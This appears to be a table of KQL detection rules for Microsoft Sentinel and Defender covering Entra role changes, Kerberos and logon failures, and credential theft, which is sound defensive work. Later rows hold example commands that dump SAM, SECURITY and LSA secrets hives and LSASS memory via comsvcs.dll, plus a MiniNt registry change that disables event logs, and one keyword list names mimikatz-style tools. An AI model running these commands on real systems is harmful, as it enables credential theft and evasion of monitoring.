58,rolemgt_pid_0013_any_fed_keyset_admin,"['Any Entra IEF ID Auth Admin Role Add, Remove, or Modify Activity', 'Can manage secrets for federation and encryption in the Identity Experience Framework (IEF).']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'aaf43236-0c0d-4d5f-883a-6955382ac081'"
59,rolemgt_pid_0043_any_password_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can reset passwords for non-administrators and Password Administrators.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '966707d0-3269-4727-9be2-8c3a10f19b9d'"
60,rolemgt_pid_0047_any_priv_role_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Entra ID, and all aspects of Privileged Identity Management', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'e8611ab8-c189-46e8-94e1-60213ab1f814'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
61,usermgt_pid_0003_user_hard_delete,['Identifies accounts that were successfully deleted'],,5,kql,[None],['t1136'],,,,entra_id,['core_directory'],azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,user_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'UserManagement'
  and OperationName =~ 'Hard Delete user'
  and Result =~ 'success'"
62,usermgt_pid_0002_user_delete,['Identifies accounts that were successfully deleted'],,5,kql,[None],['t1136'],,,,entra_id,['core_directory'],azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,user_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'UserManagement'
  and OperationName =~ 'Delete user'
  and Result =~ 'success'"
63,usermgt_pid_0001_user_add,['Identifies accounts that were successfully created'],,5,kql,[None],['t1136'],,,,entra_id,['core_directory'],azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,user_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'UserManagement'
  and OperationName =~ 'Add user'
  and Result =~ 'success'"
64,builtin_pid_0001_t1003_alerts,"['Builtin Alerts tagged with T1003', 'Alerts that trigger from t1003 emulations', 'Builtin alert filter/aggregator']",,2,kql,[None],t1003,,,[None],"['windows_os', 'mac_oc', 'linux_os']",alert_evidence,m365d_agent,m365d_security_center,,,m365d_security_center,alert_evidence,,api_advanced_hunting,,"let AlertName = dynamic(['Process memory dump', 
  'Suspicious access to LSASS service',
  'Endpoint attack notifications: Credential theft activity', 
  'Sensitive credential memory read',
  'Malicious credential theft tool execution detected', 
  'Possible attempt to steal credentials']);
let AlertKeyWord = dynamic(['DumpLsass', 'LsassDump', 'RundllLolBin', 'pypykatz', 'minidump', 'wincred',
  'mimikatz', 'MiniDump', 'PowerSploit', 'Lazagne']);
",AlertEvidence,"| extend Trigger = case(Title in~ (AlertName), 'Title Trigger',
  Title has_any (AlertKeyWord), 'Title Keyword Trigger' ,
  ThreatFamily has_any (AlertKeyWord), 'Threat Family Keyword' ,
  AttackTechniques contains 'T1003' , 'Attack Technique ID', '')
| where isnotempty(Trigger)
  and DetectionSource !contains 'Custom'"
65,builtin_pid_0002_msdt_follina_alerts,"['Builtin Alerts from msdt follina 0 day', 'Builtin alert filter/aggregator']",,2,kql,"['follina', 'lolbin', 'cve-2022-30190']",t1003,,,,windows_os,alert_evidence,m365d_agent,m365d_security_center,,,m365d_security_center,alert_evidence,,api_advanced_hunting,,"let AlertName = dynamic(['Suspicious msdt.exe behavior', 
  'Suspicious behavior by an Office application',
  'Suspicious behavior by Msdt.exe', 
  'Possible exploitation attempt of CVE-2022-30190',
  'Trojan:Win32/Mesdetty.A', 
  'Trojan:Win32/Mesdetty.B', 
  'Behavior:Win32/MesdettyLaunch.A!blk',
  'Trojan:Win32/MesdettyScript.A', 
  'Trojan:Win32/MesdettyScript.B', 
  'Behavior:Win32/MesdettyPayload.B',
  'Behavior:Win32/MesdettyLaunch.D']);
let AlertKeyWord = dynamic(['MSDT']);
",AlertEvidence,"| extend Trigger = case(Title in~ (AlertName), 'Title Trigger',
  Title has_any (AlertKeyWord), 'Title Keyword Trigger' ,
  ThreatFamily has_any (AlertKeyWord), 'Threat Family Keyword' , '')
| where isnotempty(Trigger)
  and DetectionSource !contains 'Custom'"
66,kerb_pid_0007_4768_kdc_logon_without_pre_auth,['Logon without Pre-Authentication.'],,3,kql,,,,,['::1'],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and EventData contains @'PreAuthType"">0</Data'"
67,kerb_pid_0001_4768_kdc_err_c_principal_unknown,"['Failed kerberos auth ticket request', 'KDC_ERR_C_PRINCIPAL_UNKNOWN', 'Client not found in Kerberos database', 'The username does not exist']",,5,kql,,,,,[6],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0x6'"
68,kerb_pid_0014_4771_kdc_err_preauth_failed_single_ip,"['Kerberos Pre Auth Fail', 'KDC_ERR_PREAUTH_FAILED', 'Pre-authentication information was invalid', 'The wrong password was provided']",,3,kql,,['t1110.003'],,,,active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,let TriggerThreshold = 0;,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$' 
  and Status =~ '0x18' 
| extend IpExtract = extract(@'([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})' , 0 , IpAddress)
| summarize AccountSet=make_set(TargetUserName) by IpExtract, ServiceName, Status, EventID, bin(TimeGenerated, 1h)
| extend AccountCount = array_length(AccountSet)
| where AccountCount >= TriggerThreshold"
69,kerb_pid_0006_4768_kdc_local_auth_failure,"['All Client Address ::1 means local authentication', 'If you know the list of accounts which should log on to the domain controllers,', 'then you need to monitor for all possible violations', ""Account Name isn't allowed to log on to any domain controller""]",,4,kql,,,,,['::1'],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and IpAddress == '::1'
  and Status == '0x0'"
70,kerb_pid_0009_4771_kdc_err_c_principal_unknown,"['Kerberos Pre Auth Fail', 'KDC_ERR_C_PRINCIPAL_UNKNOWN', 'Client not found in Kerberos database', 'The username does not exist']",,5,kql,,,,,[6],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0x6'"
71,kerb_pid_0012_4771_kdc_err_key_expired,"['Kerberos Pre Auth Fail', 'KDC_ERR_KEY_EXPIRED', ""The user's password has expired""]",,5,kql,,,,,[23],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0x17'"
72,kerb_pid_0011_4771_kdc_err_client_revoked,"['Kerberos Pre Auth Fail', 'KDC_ERR_CLIENT_REVOKED', 'Clients credentials have been revoked']",,5,kql,,,,,[18],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0x12'"
73,kerb_pid_0008_4768_kdc_err_c_principal_single_ip,"['KDC_ERR_C_PRINCIPAL_UNKNOWN', 'Client not found in Kerberos database', 'The username doesn’t exist.']",,3,kql,,['t1110.003'],,,[6],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,let TriggerThreshold = 0;,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0x6'
| extend IpExtract = extract(@'([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})' , 0 , IpAddress) 
| summarize AccountSet=make_set(TargetUserName) by IpExtract, ServiceName, Status, EventID, bin(TimeGenerated, 1h)
| extend AccountCount = array_length(AccountSet)
| where AccountCount >= TriggerThreshold"
74,kerb_pid_0010_4771_kdc_err_policy,"['Kerberos Pre Auth Fail', 'KDC_ERR_POLICY', 'KDC policy rejects request']",,5,kql,,,,,[12],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0xc'"
75,kerb_pid_0013_4771_kdc_err_preauth_failed,"['Kerberos Pre Auth Fail', 'KDC_ERR_PREAUTH_FAILED', 'Pre-authentication information was invalid', 'The wrong password was provided']",,5,kql,,,,,[24],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0x18'"
76,kerb_pid_0004_4768_kdc_err_key_expired,"['Failed kerberos auth ticket request', 'KDC_ERR_KEY_EXPIRED', 'Password has expired—change password to reset', 'The user’s password has expired.']",,5,kql,,,,,[23],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0x17'"
77,kerb_pid_0003_4768_kdc_err_client_revoked,"['Failed kerberos auth ticket request', 'KDC_ERR_CLIENT_REVOKED', 'Client’s credentials have been revoked', 'This might be because of an explicit disabling or because of other restrictions in place on the account', 'Example account disabled, expired, or locked out']",,5,kql,,,,,[18],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0x12'"
78,kerb_pid_0005_4768_kdc_local_auth_failure,"['All Client Address ::1 means local authentication', 'If you know the list of accounts which should log on to the domain controllers,', 'then you need to monitor for all possible violations', ""Account Name isn't allowed to log on to any domain controller""]",,4,kql,,,,,['::1'],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and IpAddress == '::1'
  and Status != '0x0'"
79,kerb_pid_0002_4768_kdc_err_policy,"['Failed kerberos auth ticket request', 'KDC_ERR_POLICY', 'Requested start time is later than end time', 'This error is usually the result of logon restrictions in place on a user’s account', 'For example workstation restriction, smart card authentication requirement or logon time restriction']",,5,kql,,,,,[12],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0xC'"
80,auth_pid_0011_4625_status_smartcard_no_card,"['Failed logons', 'STATUS_SMARTCARD_NO_CARD', 'No smart card is available.']",,5,kql,,,,,[3221226371],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000383'
  or SubStatus =~ '0xC0000383'
"
81,auth_pid_0023_4625_status_account_locked_out,"['Failed logons', 'STATUS_ACCOUNT_LOCKED_OUT', 'The user account has been automatically locked because too many invalid logon attempts or password change attempts have been requested']",,5,kql,,,,,[3221226036],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000234'
  or SubStatus =~ '0xC0000234'
"
82,auth_pid_0015_4625_status_smartcard_cert_expired,"['Failed logons', 'STATUS_SMARTCARD_CERT_EXPIRED', 'The smart card certificate used for authentication has expired']",,5,kql,,,,,[3221226381],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000038D'
  or SubStatus =~ '0xC000038D'
"
83,auth_pid_0009_4625_status_smartcard_card_blocked,"['Failed logons', 'STATUS_SMARTCARD_CARD_BLOCKED', 'The smart card is blocked.']",,5,kql,,,,,[3221226369],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000381'
  or SubStatus =~ '0xC0000381'
"
84,auth_pid_0014_4625_status_smartcard_no_keyset,"['Failed logons', 'STATUS_SMARTCARD_NO_KEYSET', 'The requested keyset does not exist']",,5,kql,,,,,[3221226374],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000386'
  or SubStatus =~ '0xC0000386'
"
85,auth_pid_0021_4625_status_trusted_relationship_failure,"['Failed logons', 'STATUS_TRUSTED_RELATIONSHIP_FAILURE', 'The logon request failed because the trust relationship between this workstation and the primary domain failed']",,5,kql,,,,,[3221225869],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000018D'
  or SubStatus =~ '0xC000018D'
"
86,auth_pid_0005_4625_status_invalid_account_name,"['Failed logons', 'STATUS_INVALID_ACCOUNT_NAME', 'The name provided is not a properly formed account name.']",,5,kql,,,,,[3221225570],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000062'
  or SubStatus =~ '0xC0000062'
"
87,auth_pid_0020_4625_status_logon_type_note_granted,"['Failed logons', 'STATUS_LOGON_TYPE_NOT_GRANTED', 'A user has requested a type of logon (for example, interactive or network) that has not been granted', 'An administrator has control over who can logon interactively and through the network']",,5,kql,,,,,[3221225566],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000005E'
  or SubStatus =~ '0xC000005E'
"
88,auth_pid_0012_4625_status_smartcard_no_key_container,"['Failed logons', 'STATUS_SMARTCARD_NO_KEY_CONTAINER', 'The requested key container does not exist on the smart card']",,5,kql,,,,,[3221226372],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000384'
  or SubStatus =~ '0xC0000384'
"
89,auth_pid_0007_4625_status_account_restriction,"['Failed logons', 'STATUS_ACCOUNT_RESTRICTION', 'Indicates a referenced user name and authentication information are valid', 'some user account restriction has prevented successful authentication (such as time-of-day restrictions)']",,5,kql,,,,,[3221225582],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000006E'
  or SubStatus =~ '0xC000006E'
"
90,auth_pid_0010_4625_status_smartcard_card_blocked,"['Failed logons', 'STATUS_SMARTCARD_CARD_NOT_AUTHENTICATED', 'No PIN was presented to the smart card']",,5,kql,,,,,[3221226370],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000382'
  or SubStatus =~ '0xC0000382'
"
91,auth_pid_0022_4625_status_password_must_change,"['Failed logons', 'STATUS_PASSWORD_MUST_CHANGE', 'The user password must be changed before logging on the first time']",,5,kql,,,,,[3221226020],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000224'
  or SubStatus =~ '0xC0000224'
"
92,auth_pid_0017_4625_status_smartcard_logon_required,"['Failed logons', 'STATUS_SMARTCARD_LOGON_REQUIRED', 'Smart card logon is required and was not used']",,5,kql,,,,,[3221226234],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC00002FA'
  or SubStatus =~ '0xC00002FA'
"
93,auth_pid_0008_4625_status_smartcard_wrong_pin,"['Failed logons', 'STATUS_SMARTCARD_WRONG_PIN', 'An incorrect PIN was presented to the smart card']",,5,kql,,,,,[3221226368],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000380'
  or SubStatus =~ '0xC0000380'
"
94,auth_pid_0013_4625_status_smartcard_no_certificates,"['Failed logons', 'STATUS_SMARTCARD_NO_CERTIFICATE', 'The requested certificate does not exist on the smart card']",,5,kql,,,,,[3221226373],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000385'
  or SubStatus =~ '0xC0000385'
"
95,auth_pid_0003_4625_status_invalid_logon_hours,"['Failed logons', 'STATUS_INVALID_LOGON_HOURS', 'The user account has time restrictions and cannot be logged onto at this time.']",,5,kql,,,,,[3221225583],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000006F'
  or SubStatus =~ '0xC000006F'
"
96,auth_pid_0024_4625_status_logon_failure_single_ip,"['Failed logons', 'See Sub Status for fail type', 'Potential Password Spray']",,3,kql,,['t1110.003'],,,,active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,let TriggerThreshold = 0;,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
  and Status == '0xc000006d'
| summarize AccountSet=make_set(TargetUserName), SubStatusSet=make_set(SubStatus) 
  by IpAddress, EventID, TargetDomainName, bin(TimeGenerated, 1h) 
| extend AccountCount = array_length(AccountSet)
| where AccountCount >= TriggerThreshold"
97,auth_pid_0019_4625_status_time_difference_at_dc,"['Failed logons', 'STATUS_TIME_DIFFERENCE_AT_DC', 'The time at the primary domain controller is different from the time at the backup domain controller or member server by too large an amount.']",,5,kql,,,,,[3221225779],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000133'
  or SubStatus =~ '0xC0000133'
"
98,auth_pid_0001_4625_status_logon_failure,"['Failed logons', 'STATUS_LOGON_FAILURE', 'The attempted logon is invalid.', 'This is either due to a bad username or authentication information.']",,5,kql,,,,,[3221225581],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xc000006d'
  or SubStatus =~ '0xc000006d'"
99,auth_pid_0002_4625_status_account_disabled,"['Failed logons', 'STATUS_ACCOUNT_DISABLED', 'The referenced account is currently disabled and cannot be logged on to.']",,5,kql,,,,,"[""0xC0000072'""]",active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000072'
  or SubStatus =~ '0xC0000072'
"
100,auth_pid_0004_4625_status_no_such_user,"['Failed logons', 'STATUS_NO_SUCH_USER', 'The specified account does not exist.']",,5,kql,,,,,[3221225572],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000064'
  or SubStatus =~ '0xC0000064'
"
101,auth_pid_0016_4625_status_password_expired,"['Failed logons', 'STATUS_PASSWORD_EXPIRED', 'The user account password has expired']",,5,kql,,,,,[3221225585],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000071'
  or SubStatus =~ '0xC0000071'
"
102,auth_pid_0018_4625_status_synchronization_required,"['Failed logons', 'STATUS_SYNCHRONIZATION_REQUIRED', 'The SAM database is significantly out of synchronization with the copy on the domain controller.', 'A complete synchronization is required.']",,5,kql,,,,,[3221225780],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000134'
  or SubStatus =~ '0xC0000134'
"
103,auth_pid_0006_4625_status_wrong_password,"['Failed logons', 'STATUS_WRONG_PASSWORD', 'This return status indicates that the value provided as the current password is not correct', 'When trying to update password']",,5,kql,,,,,[3221225578],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000006A'
  or SubStatus =~ '0xC000006A'
"
104,uam_pid_0002_4738_user_normal_account_password_not_required,['User Account Change'],,5,kql,,,,,[None],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4738,api_azure_monitor,,,SecurityEvent,"| where EventID == 4738 
  and AccountType == 'User' 
  and NewUacValue =~ '0x14'"
105,uam_pid_0003_4738_user_normal_account_password_not_required_dont_expire_password.yaml,['User Account Change'],,5,kql,,,,,[None],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4738,api_azure_monitor,,,SecurityEvent,"| where EventID == 4738 
  and AccountType == 'User' 
  and NewUacValue =~ '0x214'"
106,uam_pid_0001_4738_user_normal_account_dont_expire_password,['User Account Change'],,5,kql,,,,,[None],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4738,api_azure_monitor,,,SecurityEvent,"| where EventID == 4738 
  and AccountType == 'User' 
  and NewUacValue =~ '0x210'"
107,reg_pid_0004_hklm_lsa_secrets_save,"['reg.exe used to dump LSA secrets', 'LSA secrets are stored in the registry']",,1,kql,['lolbin'],t1003.001,,,['reg save HKLM\\security\\policy\\secrets <path to dump file>'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg'
  and ProcessCommandLine has 'save'
  and ProcessCommandLine has 'security'
  and ProcessCommandLine has 'secrets'
| where ProcessCommandLine contains 'HKLM'
  or ProcessCommandLine contains 'HKEY_LOCAL_MACHINE'"
108,reg_pid_0001_hklm_sam_save,['reg.exe used to save SAM file for potential enumeration'],,1,kql,['lolbin'],t1003.002,,,['reg save HKLM\\sam <path to dump file>'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg' 
  and ProcessCommandLine has 'save'
| where ProcessCommandLine contains 'sam'
| where ProcessCommandLine contains 'HKLM'
  or ProcessCommandLine contains 'HKEY_LOCAL_MACHINE'
"
109,reg_pid_0005_hklm_create_minint,"['The presence of MiniNT Registry key causes various Windows components to think they’re running in the Windows Preinstallation Environment.', 'Prevents windows event logs from working']",,3,kql,['lolbin'],t1562.002,,"['https://www.quppa.net/blog/2016/04/14/beware-of-the-minint-registry-key/', 'https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220803205800.html']","[""reg createkey -k 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt'"", 'REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt']",windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg'
| where ProcessCommandLine has 'SYSTEM' 
  and ProcessCommandLine has 'Control'
| where ProcessCommandLine contains @'\Control\MiniNt'
| where ProcessCommandLine has 'createkey'
  or ProcessCommandLine has 'add'"
110,reg_pid_0003_hklm_security_save,['reg.exe used to save SECURITY file for potential enumeration'],,1,kql,['lolbin'],t1003.002,,,['reg save HKLM\\security <path to dump file>'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg'
  and ProcessCommandLine has 'save'
  and ProcessCommandLine contains 'security'
| where ProcessCommandLine contains 'HKLM'
  or ProcessCommandLine contains 'HKEY_LOCAL_MACHINE'"
111,reg_pid_0003_hklm_system_save,['reg.exe used to save SYSTEM file for potential enumeration'],,2,kql,['lolbin'],t1003.002,,,['reg save HKLM\\system <path to dump file>'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg'
  and ProcessCommandLine has 'save'
  and ProcessCommandLine contains 'system'
| where ProcessCommandLine contains 'HKLM'
  or ProcessCommandLine contains 'HKEY_LOCAL_MACHINE'
| where ProcessCommandLine !contains @'system\'"
112,comsvcs_pid_0001_created_minidump,"['rundll calling comsvcs to dump process via minidump', 'potential lsass dump']",,1,kql,['lolbin'],t1003.001,,,"['rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump [LSASS_PID] dump.bin full', 'C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full', 'C:\\Windows\\System32\\rundll32.exe  C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> \\Windows\\Temp\\<filename>.dmp full', '.\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'comsvcs'
  and ProcessCommandLine has 'minidump'"
113,comsvcs_pid_0002_minidumpw_function_call,"['rundll calling comsvcs to dump process', 'function 24 is MiniDumpW function within comsvcs', 'potential lsass dump']",,1,kql,['lolbin'],t1003.001,,,"['sc  create DumpProc binpath= ""rundll32 comsvcs,#24 1204 c:\\windows\\tmp.log full""', 'rundll32.exe  comsvcs.dll,#24 600 C:\\Users\\user\\Desktop\\lsass.dmp full', 'cmd.exe /Q /c sc create DumpProc binpath= ""rundll32 comsvcs,#24 1204 c:\\windows\\tmp1654.log full"" 1> \\\\127.0.0.1\\ADMIN$\\__1622704760.494238 2>&1']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'comsvcs'
| where ProcessCommandLine contains '#24'
  or ProcessCommandLine contains '-24'"
114,comsvcs_pid_0003_created_file,"['comsvcs creating a file', 'possible .dmp file', 'potential lsass dump']",,1,kql,['lolbin'],t1003.001,,,[None],windows_os,"['file_creation', 'file_modify']",m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceFileEvents,| where InitiatingProcessCommandLine has 'comsvcs'
115,net_pid_0010_localgroup_add,['net command used to add to localgroups'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
  and ProcessCommandLine contains '/add'
"
